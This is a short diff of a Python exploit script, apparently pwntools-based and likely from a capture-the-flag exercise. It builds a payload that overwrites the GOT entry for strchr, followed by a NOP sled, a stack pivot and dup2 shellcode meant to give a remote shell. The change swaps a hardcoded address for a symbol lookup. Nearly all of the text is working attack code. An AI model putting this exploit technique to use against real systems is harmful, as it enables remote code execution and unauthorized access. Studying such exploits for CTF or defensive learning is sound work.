@@ -51,7 +51,7 @@ _asm = '''
 
 sc = asm( dup2 ) + asm( _asm )
 
-p = 'XXXX' + p32( 0x804bd78 - 0x8 ) + p32( 0x804bdbc ) + '\x90' * 400 + asm( 'mov esp, 0x804bdf0' ) + sc
+p = 'XXXX' + p32( e.got['strchr'] - 0x8 ) + p32( 0x804bdbc ) + '\x90' * 400 + asm( 'mov esp, 0x804bdf0' ) + sc
 p += 'a' * ( 500 - len( p ) )
 
 init( 1 , 500 , p )
